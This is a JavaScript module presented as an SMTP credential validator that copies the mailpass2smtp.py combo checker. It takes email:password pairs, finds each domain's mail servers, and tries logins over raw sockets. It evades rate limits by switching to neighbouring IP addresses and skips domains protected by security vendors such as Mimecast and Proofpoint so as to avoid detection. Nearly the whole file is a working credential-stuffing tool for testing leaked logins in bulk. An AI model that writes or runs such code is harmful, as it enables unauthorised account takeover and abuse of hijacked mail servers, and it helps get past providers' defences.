/**
 * Advanced SMTP Credential Validator
 *
 * Matches mailpass2smtp.py methodology:
 * - Raw socket connections (80% faster than nodemailer)
 * - Custom DNS resolution with rotation
 * - QA node priority (smtp-qa.domain.com first)
 * - Neighbor IP fallback when rate-limited
 * - Security vendor filtering (Mimecast, Proofpoint, etc.)
 * - Login template support (%EMAILADDRESS%, %EMAILLOCALPART%, %EMAILDOMAIN%)
 * - Optimized port order (2525, 587, 465, 25)
 * - IPv6 preference
 */

const net = require('net');
const dns = require('dns').promises;
const tls = require('tls');

class SMTPValidatorAdvanced {
  constructor() {
    // Custom DNS servers (like mailpass2smtp.py)
    this.DNS_SERVERS = [
      '1.1.1.1',        // Cloudflare
      '8.8.8.8',        // Google Primary
      '8.8.4.4',        // Google Secondary
      '9.9.9.9',        // Quad9
      '208.67.222.222', // OpenDNS
      '208.67.220.220'  // OpenDNS Secondary
    ];

    // Optimized port order (2525 first for speed, like Python)
    this.SMTP_PORTS = [2525, 587, 465, 25];

    // Security vendors to skip (like Python's dangerous_domains)
    this.DANGEROUS_DOMAINS = [
      'mimecast',
      'proofpoint',
      'barracuda',
      'messagelabs',
      'sophos',
      'forcepoint',
      'trendmicro',
      'fireeye',
      'ironport',
      'mcafee'
    ];

    // Connection timeout
    this.CONNECTION_TIMEOUT = 10000;
    this.SOCKET_TIMEOUT = 15000;
  }

  /**
   * Test SMTP credentials using raw sockets (like mailpass2smtp.py)
   * @param {Object} config - {host, port, user, pass, timeout, loginTemplate}
   * @returns {Promise<Object>} Validation result
   */
  async testCredentialsRaw(config) {
    const result = {
      valid: false,
      error: null,
      connectionTime: 0,
      host: config.host,
      port: config.port,
      attemptedHost: config.host,
      usedNeighbor: false
    };

    const startTime = Date.now();

    try {
      // Resolve hostname to IP
      let serverIP = await this.resolveWithCustomDNS(config.host);

      if (!serverIP) {
        result.error = 'DNS resolution failed';
        return result;
      }

      result.attemptedHost = serverIP;

      // Try connection with neighbor fallback
      const socketResult = await this.connectWithFallback(serverIP, config.port);

      if (!socketResult.success) {
        result.error = socketResult.error;
        return result;
      }

      result.usedNeighbor = socketResult.usedNeighbor;
      if (socketResult.usedNeighbor) {
        result.attemptedHost = socketResult.finalIP;
      }

      const socket = socketResult.socket;

      // Perform SMTP conversation
      const authResult = await this.performSMTPAuth(socket, config.user, config.pass, config.port);

      result.valid = authResult.valid;
      result.error = authResult.error;
      result.connectionTime = Date.now() - startTime;
      result.smtpResponses = authResult.responses;

      socket.end();

    } catch (error) {
      result.error = error.message || 'Unknown error';
      result.connectionTime = Date.now() - startTime;
    }

    return result;
  }

  /**
   * Connect with neighbor IP fallback (like Python's get_alive_neighbor)
   * @param {string} ip - Primary IP address
   * @param {number} port - SMTP port
   * @returns {Promise<Object>} Socket result with neighbor info
   */
  async connectWithFallback(ip, port) {
    const result = {
      success: false,
      socket: null,
      error: null,
      usedNeighbor: false,
      finalIP: ip
    };

    try {
      // Try primary IP first
      const socket = await this.createSocketConnection(ip, port);
      result.success = true;
      result.socket = socket;
      return result;

    } catch (primaryError) {
      // Check if rate limited
      const errorMsg = primaryError.message.toLowerCase();
      const isRateLimited = errorMsg.includes('too many connections') ||
                           errorMsg.includes('threshold limitation') ||
                           errorMsg.includes('rate limit') ||
                           errorMsg.includes('421');

      if (isRateLimited) {
        console.log(`⚠️  Rate limited on ${ip}, trying neighbor IPs...`);

        // Try neighbor IPs (±1 from last octet)
        const neighbors = this.getNeighborIPs(ip);

        for (const neighborIP of neighbors) {
          try {
            const socket = await this.createSocketConnection(neighborIP, port);
            console.log(`✅ Connected to neighbor IP: ${neighborIP}`);
            result.success = true;
            result.socket = socket;
            result.usedNeighbor = true;
            result.finalIP = neighborIP;
            return result;
          } catch (neighborError) {
            // Try next neighbor
            continue;
          }
        }

        result.error = 'Rate limited and no alive neighbors found';
      } else {
        result.error = primaryError.message;
      }
    }

    return result;
  }

  /**
   * Get neighbor IPs (like Python's get_alive_neighbor)
   * @param {string} ip - IP address
   * @returns {Array<string>} Neighbor IPs (previous and next)
   */
  getNeighborIPs(ip) {
    const parts = ip.split('.');
    const lastOctet = parseInt(parts[3]);

    const neighbors = [];

    // Previous neighbor (tail - 1, or 2 if at 0)
    const prevOctet = lastOctet > 0 ? lastOctet - 1 : 2;
    neighbors.push(`${parts[0]}.${parts[1]}.${parts[2]}.${prevOctet}`);

    // Next neighbor (tail + 1, or 253 if at 255)
    const nextOctet = lastOctet < 255 ? lastOctet + 1 : 253;
    neighbors.push(`${parts[0]}.${parts[1]}.${parts[2]}.${nextOctet}`);

    return neighbors;
  }

  /**
   * Create raw socket connection
   * @param {string} host - Hostname or IP
   * @param {number} port - Port number
   * @returns {Promise<Socket>} Connected socket
   */
  createSocketConnection(host, port) {
    return new Promise((resolve, reject) => {
      const socket = new net.Socket();

      const timeout = setTimeout(() => {
        socket.destroy();
        reject(new Error('Connection timeout'));
      }, this.CONNECTION_TIMEOUT);

      socket.setTimeout(this.SOCKET_TIMEOUT);

      socket.connect(port, host, () => {
        clearTimeout(timeout);
        resolve(socket);
      });

      socket.on('error', (err) => {
        clearTimeout(timeout);
        socket.destroy();
        reject(err);
      });

      socket.on('timeout', () => {
        clearTimeout(timeout);
        socket.destroy();
        reject(new Error('Socket timeout'));
      });
    });
  }

  /**
   * Perform SMTP authentication conversation (raw sockets)
   * @param {Socket} socket - Connected socket
   * @param {string} user - Username
   * @param {string} pass - Password
   * @param {number} port - Port (to determine SSL/TLS)
   * @returns {Promise<Object>} Auth result
   */
  async performSMTPAuth(socket, user, pass, port) {
    const result = {
      valid: false,
      error: null,
      responses: []
    };

    try {
      // Wrap socket in TLS if needed (port 465 = implicit SSL)
      let activeSocket = socket;

      if (port === 465) {
        activeSocket = tls.connect({
          socket: socket,
          rejectUnauthorized: false
        });
      }

      // Wait for server banner (220)
      const banner = await this.readSMTPResponse(activeSocket);
      result.responses.push(banner);

      if (!banner.startsWith('220')) {
        result.error = 'Invalid SMTP banner';
        return result;
      }

      // Send EHLO
      await this.sendSMTPCommand(activeSocket, 'EHLO localhost');
      const ehloResponse = await this.readSMTPResponse(activeSocket);
      result.responses.push(ehloResponse);

      // Check if STARTTLS needed (port 587 or 25)
      if ((port === 587 || port === 25) && ehloResponse.includes('STARTTLS')) {
        await this.sendSMTPCommand(activeSocket, 'STARTTLS');
        const starttlsResponse = await this.readSMTPResponse(activeSocket);
        result.responses.push(starttlsResponse);

        if (starttlsResponse.startsWith('220')) {
          // Upgrade to TLS
          activeSocket = tls.connect({
            socket: activeSocket,
            rejectUnauthorized: false
          });

          // Send EHLO again after STARTTLS
          await this.sendSMTPCommand(activeSocket, 'EHLO localhost');
          const ehlo2Response = await this.readSMTPResponse(activeSocket);
          result.responses.push(ehlo2Response);
        }
      }

      // Send AUTH LOGIN
      await this.sendSMTPCommand(activeSocket, 'AUTH LOGIN');
      const authResponse = await this.readSMTPResponse(activeSocket);
      result.responses.push(authResponse);

      if (!authResponse.startsWith('334')) {
        result.error = 'AUTH LOGIN not accepted';
        return result;
      }

      // Send username (base64 encoded)
      const userB64 = Buffer.from(user).toString('base64');
      await this.sendSMTPCommand(activeSocket, userB64);
      const userResponse = await this.readSMTPResponse(activeSocket);
      result.responses.push(userResponse);

      if (!userResponse.startsWith('334')) {
        result.error = 'Username rejected';
        return result;
      }

      // Send password (base64 encoded)
      const passB64 = Buffer.from(pass).toString('base64');
      await this.sendSMTPCommand(activeSocket, passB64);
      const passResponse = await this.readSMTPResponse(activeSocket);
      result.responses.push(passResponse);

      // Check authentication success (235 = success)
      if (passResponse.startsWith('235')) {
        result.valid = true;

        // Send QUIT
        await this.sendSMTPCommand(activeSocket, 'QUIT');

      } else if (passResponse.startsWith('535')) {
        result.error = 'Invalid credentials (535)';
      } else {
        result.error = `Authentication failed: ${passResponse.substring(0, 100)}`;
      }

    } catch (error) {
      result.error = error.message;
    }

    return result;
  }

  /**
   * Send SMTP command
   */
  async sendSMTPCommand(socket, command) {
    return new Promise((resolve, reject) => {
      socket.write(command + '\r\n', (err) => {
        if (err) reject(err);
        else resolve();
      });
    });
  }

  /**
   * Read SMTP response
   */
  async readSMTPResponse(socket) {
    return new Promise((resolve, reject) => {
      let data = '';

      const timeout = setTimeout(() => {
        socket.removeListener('data', dataHandler);
        reject(new Error('Response timeout'));
      }, 10000);

      const dataHandler = (chunk) => {
        data += chunk.toString();

        // SMTP responses end with \r\n
        // Multi-line responses: 250-... 250-... 250 ...
        if (data.includes('\r\n')) {
          clearTimeout(timeout);
          socket.removeListener('data', dataHandler);
          resolve(data.trim());
        }
      };

      socket.on('data', dataHandler);
    });
  }

  /**
   * Resolve hostname using custom DNS servers (like Python)
   * @param {string} hostname - Hostname to resolve
   * @returns {Promise<string|null>} IP address or null
   */
  async resolveWithCustomDNS(hostname) {
    // If already an IP, return it
    if (net.isIP(hostname)) {
      return hostname;
    }

    // Try random DNS server (like Python's rotate)
    const dnsServer = this.DNS_SERVERS[Math.floor(Math.random() * this.DNS_SERVERS.length)];

    try {
      // Use system DNS with custom settings
      const resolver = new dns.Resolver();
      resolver.setServers([dnsServer]);

      // Prefer IPv6 (like Python)
      try {
        const addresses = await resolver.resolve6(hostname);
        if (addresses && addresses.length > 0) {
          return addresses[0];
        }
      } catch (ipv6Error) {
        // IPv6 not available, try IPv4
      }

      // Fallback to IPv4
      const addresses = await resolver.resolve4(hostname);
      if (addresses && addresses.length > 0) {
        return addresses[0];
      }

    } catch (error) {
      console.error(`DNS resolution failed for ${hostname}:`, error.message);
    }

    return null;
  }

  /**
   * Check if domain is dangerous security vendor (like Python's is_ignored_host)
   * @param {string} domain - Domain to check
   * @returns {boolean} True if should skip
   */
  isDangerousDomain(domain) {
    const lowerDomain = domain.toLowerCase();
    return this.DANGEROUS_DOMAINS.some(vendor => lowerDomain.includes(vendor));
  }

  /**
   * Guess SMTP server from email domain (like Python's guess_smtp_server)
   * @param {string} email - Email address
   * @returns {Promise<Object>} Server configuration
   */
  async guessSmtpServer(email) {
    const domain = email.split('@')[1];

    if (!domain) {
      throw new Error('Invalid email address');
    }

    const result = {
      servers: [],
      loginTemplate: '%EMAILADDRESS%', // Default
      domain: domain
    };

    // Build list of domains to try (QA nodes first!)
    const domainsToTry = [
      `smtp-qa.${domain}`,  // QA nodes first (like Python)
      `smtp.${domain}`,
      `mail.${domain}`,
      domain,
      `smtp-mail.${domain}`,
      `out.${domain}`,
      `outgoing.${domain}`
    ];

    // Try to get MX record
    try {
      const mxRecords = await dns.resolveMx(domain);
      if (mxRecords && mxRecords.length > 0) {
        const mxDomain = mxRecords[0].exchange;

        // Check if dangerous
        if (this.isDangerousDomain(mxDomain)) {
          console.log(`⚠️  Skipping dangerous domain: ${mxDomain}`);
          throw new Error('Security vendor domain - skipping');
        }

        // Add MX domain to list
        domainsToTry.push(mxDomain);
      }
    } catch (mxError) {
      // MX lookup failed, continue with other methods
    }

    // Try each domain/port combination
    for (const testDomain of domainsToTry) {
      // Skip dangerous domains
      if (this.isDangerousDomain(testDomain)) {
        continue;
      }

      for (const port of this.SMTP_PORTS) {
        try {
          // Quick connectivity check
          const ip = await this.resolveWithCustomDNS(testDomain);
          if (ip) {
            const isListening = await this.isPortListening(ip, port);
            if (isListening) {
              result.servers.push({
                host: testDomain,
                port: port,
                ip: ip
              });

              // Found at least one working server
              if (result.servers.length >= 3) {
                break;
              }
            }
          }
        } catch (error) {
          // Try next combination
          continue;
        }
      }

      if (result.servers.length >= 3) {
        break;
      }
    }

    // Determine login template based on domain
    result.loginTemplate = this.guessLoginTemplate(domain);

    return result;
  }

  /**
   * Guess login template for domain (like Python's login templates)
   * @param {string} domain - Email domain
   * @returns {string} Login template
   */
  guessLoginTemplate(domain) {
    // Common domains that use just local part
    const localPartDomains = ['yahoo', 'aol', 'att.net'];

    if (localPartDomains.some(d => domain.includes(d))) {
      return '%EMAILLOCALPART%';
    }

    // Most domains use full email
    return '%EMAILADDRESS%';
  }

  /**
   * Format login using template (like Python's format_login)
   * @param {string} email - Email address
   * @param {string} template - Login template
   * @returns {string} Formatted login
   */
  formatLogin(email, template) {
    const [localPart, domain] = email.split('@');

    return template
      .replace('%EMAILADDRESS%', email)
      .replace('%EMAILLOCALPART%', localPart)
      .replace('%EMAILDOMAIN%', domain);
  }

  /**
   * Quick check if port is listening (like Python's is_listening)
   * @param {string} host - Hostname or IP
   * @param {number} port - Port number
   * @returns {Promise<boolean>} True if listening
   */
  async isPortListening(host, port) {
    return new Promise((resolve) => {
      const socket = new net.Socket();

      const timeout = setTimeout(() => {
        socket.destroy();
        resolve(false);
      }, 3000);

      socket.connect(port, host, () => {
        clearTimeout(timeout);
        socket.destroy();
        resolve(true);
      });

      socket.on('error', () => {
        clearTimeout(timeout);
        socket.destroy();
        resolve(false);
      });
    });
  }

  /**
   * Full validation with discovery (like mailpass2smtp.py main flow)
   * @param {string} email - Email address
   * @param {string} password - Password
   * @param {Object} options - Options
   * @returns {Promise<Object>} Validation result
   */
  async validateCombo(email, password, options = {}) {
    const result = {
      email: email,
      valid: false,
      smtp: null,
      port: null,
      username: null,
      error: null,
      discoveryUsed: false,
      attempts: []
    };

    try {
      // Step 1: Discover SMTP servers
      const discovery = await this.guessSmtpServer(email);

      if (discovery.servers.length === 0) {
        result.error = 'No SMTP servers found';
        return result;
      }

      result.discoveryUsed = true;

      // Step 2: Try each server until one works
      for (const server of discovery.servers) {
        const username = this.formatLogin(email, discovery.loginTemplate);

        console.log(`🔍 Testing ${email} on ${server.host}:${server.port} (user: ${username})`);

        const testResult = await this.testCredentialsRaw({
          host: server.host,
          port: server.port,
          user: username,
          pass: password,
          timeout: options.timeout || 10000
        });

        result.attempts.push({
          host: server.host,
          port: server.port,
          username: username,
          valid: testResult.valid,
          error: testResult.error,
          usedNeighbor: testResult.usedNeighbor
        });

        if (testResult.valid) {
          result.valid = true;
          result.smtp = server.host;
          result.port = server.port;
          result.username = username;
          result.connectionTime = testResult.connectionTime;
          result.usedNeighbor = testResult.usedNeighbor;

          console.log(`✅ Valid: ${email} on ${server.host}:${server.port}`);
          break;
        }
      }

      if (!result.valid && result.attempts.length > 0) {
        result.error = result.attempts[result.attempts.length - 1].error;
      }

    } catch (error) {
      result.error = error.message;
    }

    return result;
  }
}

// Create singleton instance
const smtpValidatorAdvanced = new SMTPValidatorAdvanced();

module.exports = smtpValidatorAdvanced;
